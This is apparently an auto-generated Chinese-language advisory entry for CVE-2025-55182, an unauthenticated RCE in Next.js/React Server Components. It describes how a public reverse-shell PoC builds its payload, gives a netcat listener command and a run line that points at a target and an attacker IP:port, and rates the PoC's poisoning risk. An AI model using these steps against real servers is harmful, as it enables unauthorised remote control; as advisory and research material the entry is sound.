## CVE-2025-55182 - React Server Components, Next.js 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** React Server Components, Next.js

**危害等级:** 严重 (Critical)

**CVSS评分:** 10.0

**影响版本:** Next.js 15.x, Next.js 16.x (截至2025年12月3日), 以及受影响的React Server Components实现

**利用条件:** 无需认证, 通过构造恶意的multipart表单发送HTTP请求, 可远程利用

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-55182，又被称为“React2Shell”，是一个极其严重的远程代码执行（RCE）漏洞，CVSS评分高达10.0。该漏洞主要影响Next.js框架中使用的React Server Components（RSC）架构。其核心问题在于React Flight反序列化机制未能充分校验对象属性访问路径，例如对`__proto__`和`constructor`等原型链属性的访问，导致攻击者能够通过精心构造的输入，实现原型链污染，进而执行任意代码。

**POC有效性分析**
所提供的Python POC脚本（`CVE-2025-55182-revshell.py`）是一个功能完备、高度有效的完整利用工具。它设计用于利用CVE-2025-55182漏洞，在受影响的Next.js/React Server Components应用程序上获取反向Shell。脚本接收目标URL和攻击者的监听地址（LHOST:LPORT）作为参数，大大简化了利用过程。它通过向目标应用程序的`/_next/static/chunks/react-flight`端点发送特制的`multipart/form-data`请求来触发漏洞。攻击的关键在于构造一个包含恶意JavaScript代码的JSON-like流（在POC中表示为`evil`变量），利用`{"__type":"Function","code":"..."}`结构来动态创建和执行函数。这个函数内部利用`global.process.mainModule.require('child_process').exec()`来执行任意系统命令。为了最大化利用成功率，POC内置了针对不同操作系统的多种反向Shell负载，包括Bash、Netcat和PowerShell。脚本会依次尝试发送这些负载，确保无论是Linux还是Windows目标，都有较高的成功率。POC在执行过程中会输出详细的状态信息，并且支持设置超时，便于用户理解和调试。综合来看，这是一个高质量的、直接提供反向Shell的可靠利用POC。

**利用步骤**
1.  **准备攻击者环境**：在攻击者的机器上，安装Python 3和`requests`库。启动一个网络监听器，例如使用Netcat：`nc -lvnp <LPORT>`，用于接收反向Shell。
2.  **获取POC脚本**：下载或编写提供的`CVE-2025-55182-revshell.py`脚本。
3.  **识别目标**：确定一个运行未打补丁的Next.js 15.x或16.x应用程序的目标URL。
4.  **执行POC**：在命令行中运行POC脚本，提供目标URL和攻击者监听器的IP地址及端口。例如：`python3 CVE-2025-55182-revshell.py https://example.com 10.10.14.66:4444`。
5.  **建立连接**：POC脚本将自动向目标服务器发送恶意请求。如果攻击成功，攻击者机器上的监听器将在几秒钟内收到来自目标服务器的反向Shell连接。
6.  **执行命令**：攻击者获得Shell后，即可在目标服务器上执行任意系统命令，实现完全的远程控制。

**投毒风险分析**
对提供的POC代码进行深入分析后，评估其投毒风险为**低 (10%)**。该POC的源代码完全开源且结构清晰，没有使用任何混淆技术，使得其意图和行为一目了然。脚本的核心功能是利用一个已知的RCE漏洞，以获取目标系统的反向Shell，这是安全测试中常见的操作。它仅依赖于Python标准库和广泛使用的第三方库`requests`，没有引入任何可疑或鲜为人知的依赖项，从而降低了供应链投毒的风险。

在代码中，没有发现任何与预期漏洞利用无关的恶意行为。具体来说，它不包含任何向外部未知服务器发送敏感数据、安装后门程序、修改系统配置或执行其他破坏性操作的代码。POC所包含的Bash、Netcat和PowerShell反向Shell负载是标准的漏洞利用技术，它们的目的是在受害系统上建立一个交互式Shell，而非针对运行POC的本地系统进行攻击或感染。尽管这些命令在某些安全产品中可能被标记为恶意行为，但这完全符合POC作为漏洞利用工具的预期功能，而非其本身带有额外的恶意payload。

综上所述，该POC是一个用于合法安全研究和漏洞验证的工具。其代码透明、依赖可靠且功能单一，不存在对运行其脚本的用户或系统进行投毒的迹象。在使用此POC时，研究人员应确保其攻击目标是授权的测试环境，并对LHOST:LPORT参数有完全的控制。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
